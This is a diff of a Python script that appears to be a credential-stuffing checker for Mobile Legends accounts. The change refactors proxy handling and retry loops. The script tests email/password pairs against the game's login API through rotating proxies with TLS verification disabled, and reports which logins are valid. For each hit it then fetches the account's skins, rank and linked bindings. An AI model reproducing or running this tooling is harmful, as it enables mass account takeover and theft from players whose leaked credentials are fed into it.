@@ -21,31 +21,19 @@ def get_proxy_url():
     ip, port, user, pwd = raw.split(":")
     return f"http://{user}:{pwd}@{ip}:{port}"
 
-async def get_async_client(retries=5):
-    """ Try getting a working client with a good proxy """
-    for _ in range(retries):
-        try:
-            proxy_url = get_proxy_url()
-            transport = httpx.AsyncHTTPTransport(proxy=proxy_url, verify=False)
-            client = httpx.AsyncClient(transport=transport, timeout=httpx.Timeout(10.0))
-
-            # Test proxy quickly
-            r = await client.get("https://httpbin.org/ip")
-            if r.status_code == 200:
-                return client
-        except Exception:
-            await client.aclose()
-            continue
-    raise Exception("No working proxy found.")
+async def get_async_client():
+    proxy_url = get_proxy_url()
+    transport = httpx.AsyncHTTPTransport(proxy=proxy_url, verify=False)
+    return httpx.AsyncClient(transport=transport, timeout=httpx.Timeout(10.0))
 
 async def get_profile(access_token, user_id):
     url = "https://accountmtapi.mobilelegends.com/Account/profile"
     headers = {"Authorization": f"Bearer {access_token}"}
     data = {"user_id": user_id, "format": 2}
 
-    for _ in range(3):  # Retry profile fetching up to 3 times
-        try:
-            async with await get_async_client() as client:
+    async with await get_async_client() as client:
+        for _ in range(3):  # Retry up to 3 times
+            try:
                 res = await client.post(url, data=data, headers=headers)
                 if res.status_code == 200:
                     info = res.json().get("data", {})
@@ -53,10 +41,10 @@ async def get_profile(access_token, user_id):
                     rank = info.get("rank_name", "Unknown")
                     bindings = [b.get("bind_type", "Unknown") for b in info.get("bind_list", [])]
                     return total_skins, rank, bindings
-        except Exception:
-            print("Error fetching profile, retrying...")
-            traceback.print_exc()
-            await asyncio.sleep(1)
+            except Exception:
+                print("Error fetching profile, retrying...")
+                traceback.print_exc()
+                await asyncio.sleep(1)
     return 0, "Unknown", []
 
 async def check_account(email, password):
@@ -64,12 +52,12 @@ async def check_account(email, password):
     data = {"email": email, "password": password, "os_type": 2, "format": 2, "secret": ""}
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
 
-    for _ in range(3):  # Retry login up to 3 times
-        try:
-            async with await get_async_client() as client:
+    async with await get_async_client() as client:
+        for _ in range(3):  # Retry up to 3 times
+            try:
                 res = await client.post(login_url, data=data, headers=headers)
-                results["total"] += 1
                 if res.status_code == 200 and res.json().get("code") == 200:
+                    results["total"] += 1
                     access_token = res.json()["data"]["access_token"]
                     user_id = res.json()["data"]["user_id"]
                     skins, rank, bindings = await get_profile(access_token, user_id)
@@ -85,13 +73,14 @@ async def check_account(email, password):
                     print(f"[+] Valid account: {email}")
                     return "working"
                 else:
+                    results["total"] += 1
                     results["invalid"] += 1
                     print(f"[-] Invalid account: {email}")
                     return "invalid"
-        except Exception:
-            print("Error checking account, retrying...")
-            traceback.print_exc()
-            await asyncio.sleep(1)
+            except Exception:
+                print("Error checking account, retrying...")
+                traceback.print_exc()
+                await asyncio.sleep(1)
     return "error"
 
 @app.get("/", response_class=HTMLResponse)
